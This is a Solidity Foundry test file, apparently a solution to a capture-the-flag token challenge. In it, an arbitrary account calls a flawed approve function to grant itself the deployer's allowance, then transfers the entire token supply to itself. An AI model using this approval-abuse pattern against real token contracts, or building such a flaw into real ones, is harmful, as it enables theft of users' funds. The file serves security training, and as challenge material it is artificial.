// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {BaseTest} from "./utils/BaseTest.t.sol";
import {Challenge02} from "src/Challenge02.sol";

contract CounterTest is BaseTest {
    MockToken mockToken;

    function setUp() public {
        mockToken = new MockToken();
    }

    function test_ExploitApprove() public {
        vm.startPrank(random);
        mockToken.approve(deployer, random, type(uint256).max);
        mockToken.transferFrom(deployer, random, type(uint256).max);

        assertEq(mockToken.balanceOf(random), type(uint256).max);

        vm.stopPrank();
    }
}

contract MockToken is Challenge02 {
    constructor() Challenge02("Challenge02", "ch2", 18) {
        _mint(msg.sender, type(uint256).max);
    }
}
